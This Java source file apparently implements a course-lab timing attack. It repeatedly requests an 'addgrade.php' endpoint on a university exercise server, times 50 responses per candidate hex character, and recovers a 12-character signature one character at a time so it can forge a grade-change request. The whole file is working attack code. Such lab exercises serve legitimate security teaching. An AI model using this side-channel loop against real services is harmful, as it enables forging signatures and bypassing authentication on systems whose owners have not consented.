package main;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.URL;
import java.net.URLConnection;

public class TimingAttack {

	public TimingAttack() {

		URL url = null;
		char[] alphabet = "abcdef0123456789".toCharArray();
		URLConnection yc = null;

		StringBuilder a = null;
		StringBuilder b = new StringBuilder("");

		for (int k = 0; k < 12; k++) {

			char currentBestGuess = 0;

			long longestTime = 0;

			for (int i = 0; i < alphabet.length; i++) {
				System.out.print(alphabet[i] + ", ");

				long duration = 0;
				long startTime = System.nanoTime();

				for (int j = 0; j < 50; j++) {

					try {

						if (b.toString().equals("")) {
							url = new URL(
									"https://eitn41.eit.lth.se:3119/ha4/addgrade.php?name=Kalle&grade=5&signature="
											+ alphabet[i]);
						} else {
							url = new URL(
									"https://eitn41.eit.lth.se:3119/ha4/addgrade.php?name=Kalle&grade=5&signature="
											+ b.toString() + alphabet[i]);
						}

						yc = url.openConnection();

						BufferedReader in = new BufferedReader(new InputStreamReader(yc.getInputStream(), "UTF-8"));
						String inputLine;
						a = new StringBuilder();
						while ((inputLine = in.readLine()) != null) {
							a.append(inputLine);
						}
						in.close();

					} catch (IOException e) {

						e.printStackTrace();
					}

				}

				long endTime = System.nanoTime();
				duration = (endTime - startTime) / 50;

				if (duration > longestTime) {
					longestTime = duration;
					currentBestGuess = alphabet[i];
				}

			}
			b.append(String.valueOf(currentBestGuess));
			System.out.println("Best guess: " + currentBestGuess);
		}
		System.out.println(b.toString());
	}

	public void startAttack() {

	}
}
